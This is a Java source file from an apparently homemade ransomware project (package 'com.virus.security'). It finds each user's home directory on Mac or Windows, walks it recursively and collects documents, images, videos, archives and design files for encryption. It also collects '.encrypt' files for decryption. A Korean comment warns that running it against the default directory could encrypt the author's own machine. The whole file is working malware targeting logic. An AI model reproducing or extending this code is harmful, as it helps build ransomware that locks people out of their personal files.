package com.virus.security;

import org.apache.commons.io.FilenameUtils;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by codertimo on 15. 11. 16..
 */
public class SearchDirectory {


    private String defaultDirectiory;

    private ArrayList<File> allFiles = new ArrayList<>();
    private ArrayList<File> encryptedFiles = new ArrayList<>();

    private ArrayList<String> containsfilters = new ArrayList<>();


    public SearchDirectory()
    {
        /**
         * !!!주의!!!
         * 암호화 테스트 코드를 실행할 때에는 절대 setDefaultDirectory()를 사용하여 테스트를 하지 마세요
         * 본인의 컴퓨터가 암호화 될 수 있습니다
         **/

        //1. 암호화 할 경로 설정

        setDefaultDirectory("/Users/codertimo/Desktop/test/");
 //        setDefaultDirectiory();

        //2. 암호화할 파일 타입을 설정
        initContainFilter();

    }

    public ArrayList<File> allFileSearch()
    {

        System.out.println("디렉토리 검색 시작");

        System.out.println(defaultDirectiory);

        getFileList(defaultDirectiory);
        System.out.println("디렉토리 검색 끝");

        return allFiles;
    }

    public ArrayList<File> decryptSearch()
    {

        System.out.println("디렉토리 검색 시작");
        System.out.println(defaultDirectiory);

        getEncryptedList(defaultDirectiory);

        System.out.println("디렉토리 검색 끝");

        return encryptedFiles;
    }


    /**
     * 암호화할 코드
     */
    private void initContainFilter()
    {
        containsfilters.add("jpg");
        containsfilters.add("docx");
        containsfilters.add("hwp");
        containsfilters.add("pptx");
        containsfilters.add("ppt");
        containsfilters.add("avi");
        containsfilters.add("mp4");
        containsfilters.add("mkv");
        containsfilters.add("max");
        containsfilters.add("cad");
        containsfilters.add("zip");
        containsfilters.add("pdf");
        containsfilters.add("psd");
    }


    /**
     * OS별 최상위 디렉토리 설정
     */
    private void setDefaultDirectory()
    {
        String os = System.getProperty("os.name").split(" ")[0];
        switch (os)
        {
            case "Mac":
                setMacDefaultDirectory();
                break;

            case "Windows":
                setWindowDefaultDirectory();
                break;
        }
    }

    /**
     * 최상위 디렉토리 사용자 설정
     * @param defaultDirectory
     */
    private void setDefaultDirectory(String defaultDirectory)
    {
        this.defaultDirectiory = defaultDirectory;
    }

    /**
     * 기본 디렉토리 설정 : Mac 용
     */
    private void setMacDefaultDirectory()
    {
        File macDir = new File("/Users/");
        File[] fileList = macDir.listFiles();
        try {
            if (fileList != null) {
                for (File file : fileList) {
                    System.out.println(file.getName());
                    if (!file.getName().equals("Guest") && !file.getName().equals("Shared"))
                    {
                        this.defaultDirectiory = file.getCanonicalPath();
                    }
                }
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     *  기본 디렉토리 설정 : Window용
     */
    private void setWindowDefaultDirectory()
    {
        File windowDir = new File(System.getenv("SystemDrive")+"\\Users\\");
        File[] fileList = windowDir.listFiles();
        try {
            if (fileList != null) {
                for (File file : fileList) {
                    if (!file.getName().equals("Public")) {
                        this.defaultDirectiory= file.getCanonicalPath();
                    }
                }
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    /**
     * souce에 주어진 경로에 있는 모든 파일을 훑음, 또한 하위 디렉토리 존재시, 재귀로 다시 호출
     * @param source
     */
    private void getFileList(String source){
        File dir = new File(source);
        File[] fileList = dir.listFiles();
        try{
            if (fileList != null) {
                for(File file : fileList){
                    if(file.isFile()){

                        // 파일이 있다면 파일 추가
                        if(isAvailableFile(file)) {
                            allFiles.add(file);
                        }
                    }
                    else if(file.isDirectory())
                    {
                        // 서브디렉토리가 존재하면 재귀적 방법으로 다시 탐색
                        System.out.println(file.getCanonicalPath());
                        getFileList(file.getCanonicalPath());
                        System.out.println("----------------------");
                    }
                }
            }
        }
        catch(Exception e) {
            e.printStackTrace();
        }
    }

    private void getEncryptedList(String source){
        File dir = new File(source);
        File[] fileList = dir.listFiles();
        try{
            if (fileList != null) {
                for(File file : fileList){
                    if(file.isFile()){
                        // 파일이 있다면 파일 추가
                        if(FilenameUtils.getExtension(file.getName()).equals("encrypt"))
                        {
                            encryptedFiles.add(file);
                        }
                    }
                    else if(file.isDirectory())
                    {
                        // 서브디렉토리가 존재하면 재귀적 방법으로 다시 탐색
                        System.out.println(file.getCanonicalPath());
                        getEncryptedList(file.getCanonicalPath());
                        System.out.println("----------------------");
                    }
                }
            }
        }
        catch(Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 필터에 부합하는 파일인지 확인
     * @param file
     * @return
     */

    private boolean isAvailableFile(File file)
    {
            return this.containsfilters.contains(FilenameUtils.getExtension(file.getName()));
    }

    public void clearFiles()
    {
        this.encryptedFiles.clear();
        this.allFiles.clear();
    }

}
